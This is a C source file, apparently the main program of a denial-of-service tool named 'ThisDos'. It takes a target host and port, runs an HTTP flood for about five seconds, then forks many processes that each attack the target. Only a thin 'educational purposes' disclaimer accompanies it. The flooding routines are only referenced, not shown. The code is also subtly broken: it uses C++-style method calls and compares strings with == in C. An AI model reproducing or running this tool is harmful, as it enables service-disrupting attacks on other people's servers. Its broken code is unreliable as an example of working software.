/*
This program is licensed under the GNU General Public License v3.
Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
See https://www.gnu.org/licenses/gpl-3.0.html for details.
*/
#include "libz/basedos.h"
#include "libz/common.h"
#include "libz/httpdos.h"
#include "thisdos.h"

#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include "libz/datatype.h"
#include <time.h>

#define BILLION 1000000000L


static const char first_msg[] = 
"ThisDos Project"
"A tool designed to perform Dos attacks,only for educational purposes, not illegal!"
"It is user end responsibility to obey the federal laws to ensure that this program does not make any harm to any server";
static const char help_me[] = 
"\nATTACK METHODS:\n"
"\n--http/-H: Http Dos attack.\n"
"\n--help: Show help menu\n";
clock_t start_time, end_time;
double cpu_time_used;

int main(int argc, char **argv) {
    if (argc < 3 || strcmp(argv[1], "--help") == 0) {
        printf("Usage: %s <target> <port>\n", argv[0]);
        printf("Options:\n");
        printf("--help: Show help menu\n");
        exit(1);
    }

    printf("ThisDos Project\n");
    print_program_banner();

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0) {
            printf("Usage: %s <target> <port>\n", argv[0]);
            printf("Options:\n");
            printf(help_me);
            exit(0);
        }
        if (strcmp(argv[i], "--http") == 0 || strcmp(argv[i], "-H") == 0) {
            conf.insert("http", "true");
        }
    }
    struct timespec start_time, end_time;
    double cpu_time_used;

HttpDos:
    if (conf.get("http") == "true") {
        double total_time = 0.0;
        int max_time = 5; // Maximum allowed time in seconds
        while (total_time < max_time) {
            struct timespec start_time, end_time;
            clock_gettime(CLOCK_MONOTONIC, &start_time);
            runHttpDos(argv[1], argv[2]);
            clock_gettime(CLOCK_MONOTONIC, &end_time);
            double cpu_time_used = (end_time.tv_sec - start_time.tv_sec) + (double)(end_time.tv_nsec - start_time.tv_nsec) / BILLION;
            total_time += cpu_time_used;
            if (total_time >= max_time) {
                goto BaseDos;
            }
        }
    }


    BaseDos:
    for (int x = 0; x < THREADS; x++) {
        if (fork() == 0) {
            attack(argv[1], argv[2], x);
            exit(0);
        }
        usleep(250000);
    }


    // Wait for user input before exiting
    getc(stdin);
    return 0;
}